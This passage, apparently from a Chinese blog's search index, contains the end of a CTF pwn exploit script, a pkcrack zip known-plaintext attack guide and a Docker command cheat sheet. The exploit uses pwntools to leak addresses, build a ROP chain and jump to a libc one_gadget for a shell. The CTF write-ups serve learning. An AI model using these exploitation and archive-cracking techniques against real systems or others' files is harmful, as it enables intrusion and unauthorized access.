class="line">    run(<span class="number">100</span>,<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Question:"</span>)</span><br><span class="line">    q = sh.recvuntil(<span class="string">"="</span>)[:<span class="number">-1</span>]</span><br><span class="line">    ans =  eval(q.strip())</span><br><span class="line">    sh.recv()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.send(str(ans).ljust(<span class="number">0x30</span>, <span class="string">'\x00'</span>) +<span class="string">'\xcd'</span>)</span><br><span class="line">        <span class="comment"># leak addr</span></span><br><span class="line">        sh.recvuntil(<span class="string">'Level '</span>)</span><br><span class="line">        medium = sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">        medium = int(medium)</span><br><span class="line">        <span class="keyword">if</span> medium &lt; <span class="number">0</span>:</span><br><span class="line">            medium = <span class="number">0x100000000</span> + medium</span><br><span class="line">        medium = hex(medium)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">print</span> medium</span><br><span class="line">        <span class="keyword">if</span> len(medium)&lt;<span class="number">8</span>:</span><br><span class="line">            medium = medium.rjust(<span class="number">8</span>,<span class="string">'0'</span>)</span><br><span class="line">        real_addr = <span class="string">'000055'</span>+ medium +<span class="string">'8b'</span></span><br><span class="line">        <span class="keyword">print</span> real_addr</span><br><span class="line">        <span class="comment"># make stack arguments</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sent successfully!'</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    code_base = int(real_addr,<span class="number">16</span>) - <span class="number">3723</span></span><br><span class="line">    pop_rdi = code_base+<span class="number">0x1033</span></span><br><span class="line">    __libc_start_main_addr_got = code_base + elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    puts_plt = code_base + elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    main_addr = code_base + <span class="number">3911</span></span><br><span class="line">    sh.send(<span class="string">'a'</span>*<span class="number">56</span>+p64(pop_rdi)+p64(__libc_start_main_addr_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.recv()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc_addr = u64(sh.recv() + <span class="string">'\x00\x00'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'solved!!\n'</span></span><br><span class="line">    one_gadget = - libc.symbols[<span class="string">'__libc_start_main'</span>] + <span class="number">0x4526a</span> + libc_addr</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    run(<span class="number">100</span>,<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Question:"</span>)</span><br><span class="line">    q = sh.recvuntil(<span class="string">"="</span>)[:<span class="number">-1</span>]</span><br><span class="line">    ans =  eval(q.strip())</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.send(str(ans).ljust(<span class="number">0x38</span>, <span class="string">'\x00'</span>) +p64(one_gadget))</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ida </tag>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip的选择明文攻击</title>
      <link href="/2019/03/16/zip%E7%9A%84%E9%80%89%E6%8B%A9%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/"/>
      <url>/2019/03/16/zip%E7%9A%84%E9%80%89%E6%8B%A9%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<ul><li>拿到pkcrack里跑，首先拿到pkcrack<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/pkcrack-1.2.2.tar.gz</span><br><span class="line">tar xzf pkcrack-1.2.2.tar.gz</span><br><span class="line">cd pkcrack-1.2.2/src</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">mkdir -p ../../bin</span><br><span class="line">cp pkcrack ../../bin</span><br><span class="line">cd ../../</span><br></pre></td></tr></table></figure></li></ul><p><strong>攻击成功的前提条件是加密zip里有一个已知文件. 那么利用unzip -v可以查看zip压缩算法的版本以及crc32来对比，题目是否是考察此点。</strong><br><a id="more"></a> </p><blockquote><ul><li><strong>约定如下</strong><br>加密的zip: <strong>encrypted.zip</strong><br>包含明文的zip包: <strong>plain.zip</strong><br><strong>文件结构</strong><br>//encrypted.zip<br>–folder1<br>password.txt<br>–folder2<br>plain.txt<br>//plain.zip<br>plain2.txt</li></ul></blockquote><h3><span id="pkcrack的用法如下">pkcrack的用法如下：</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pkcrack –c “folder2/plain.txt” –p plain2.txt –C encrypted.zip –P plain.zip -d ok.zip</span><br></pre></td></tr></table></figure><p>参数解释：</p><ul><li><p>C : 要破解的目标文件（含路径）</p></li><li><p>c ：破解文件中的明文文件的名字（其路径不包括系统路径，从zip文件一层开始）</p></li><li><p>P ：压缩后的明文文件</p></li><li><p>p : 压缩的明文文件中明文文件的名字（也就是readme.txt在plain.zip中的位置）</p></li><li><p>d : 最后得到的没有加密的zip文件</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> zip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker基本命令</title>
      <link href="/2019/03/16/docker%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
      <url>/2019/03/16/docker%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1><span id="运行容器">运行容器</span></h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker run IMAGE COMMAND [ARGS]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互式的</span></span><br><span class="line">docker run -i -t IMAGE /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定名字的</span></span><br><span class="line">docker run --name=container01 -i -t ubuntu /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动停止的容器</span></span><br><span class="line">docker start -i NAME</span><br></pre></td></tr></table></figure><p>其中-i表示interactive，-t表示建立一个伪tty终端</p><h1><span id="删除容器">删除容器</span></h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm name或者id <span class="comment"># 只能用来删除停止了的容器</span></span><br></pre></td></tr></table></figure><a id="more"></a> <h1><span id="查看建立过的容器">查看建立过的容器</span></h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a <span class="comment"># 建立过的所有容器</span></span><br><span class="line"></span><br><span class="line">docker ps -l <span class="comment"># 最新创建的容器</span></span><br></pre></td></tr></table></figure><p>这里可以看到docker的ps命令给出了很多信息，第一个ID是唯一标示，最后一列名字为自动分配的名字，都可以作为指定容器的参数。比如作为inspect的参数，inspect返回配置信息等<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect nostalgic_bartik</span><br></pre></td></tr></table></figure></p><h1><span id="守护式容器">守护式容器</span></h1><p>特点如下：</p><ul><li>长期运行没有交互式会话</li><li>适合运行应用和服务</li></ul><p><strong>方法</strong>：在运行交互式的容器中使用ctrl+q或者ctrl+p</p><p>然后可以使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach NAME/ID <span class="comment">#重新连接</span></span><br></pre></td></tr></table></figure></p><p><strong>直接启动守护式容器</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d IMAGE [COMMAND] [ARGS]</span><br></pre></td></tr></table></figure></p><h2><span id="日志命令">日志命令</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker logs [-f] [-t] [-tail] 容器名</span><br><span class="line">- f --follows=<span class="literal">true</span>|<span class="literal">false</span> 默认为<span class="literal">false</span></span><br><span class="line">- t --timestamp=<span class="literal">true</span>|<span class="literal">false</span> 默认为<span class="literal">false</span></span><br><span class="line">-tail number 不加表示显示所有日志</span><br></pre></td></tr></table></figure><h2><span id="查看进程-top">查看进程 top</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top name</span><br></pre></td></tr></table></figure><h2><span id="运行中的容器启动新的进程">运行中的容器启动新的进程</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> [-d] [-i] [-t] 容器名 [<span class="built_in">command</span>] [args]</span><br></pre></td></tr></table></figure><h2><span id="停止守护式容器">停止守护式容器</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker stop name <span class="comment"># 发送信号给容器等待停止</span></span><br><span class="line">docker <span class="built_in">kill</span> name <span class="comment"># 强制停止</span></span><br></pre></td></tr></table></figure><h1><span id="端口映射">端口映射</span></h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">run [-P] [-p]</span><br><span class="line"></span><br><span class="line">[-P] --publish-all=<span class="literal">true</span> | <span class="literal">false</span> 默认为<span class="literal">false</span></span><br><span class="line">docker run -P -i -t ubuntu /bin/bash</span><br><span class="line">[-p] --publish[]</span><br><span class="line"><span class="comment"># containerPort</span></span><br><span class="line">docker run -p 80 -i -t ubuntu /bin/bash</span><br><span class="line"><span class="comment"># hostPort:containerPort</span></span><br><span class="line">docker run -p 8080:80 -i -t ubuntu /bin/bash</span><br><span class="line"><span class="comment"># containerip:containerPort</span></span><br><span class="line">docker run -P 0.0.0.0::80 -i -t ubuntu /bin/bash</span><br><span class="line"><span class="comment"># containerip:hostPort:containerPort</span></span><br><span class="line">docker run -p 0.0.0.0:8080:80 -i -t ubuntu /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看端口映射配置</span></span><br><span class="line">docker port container_ID</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
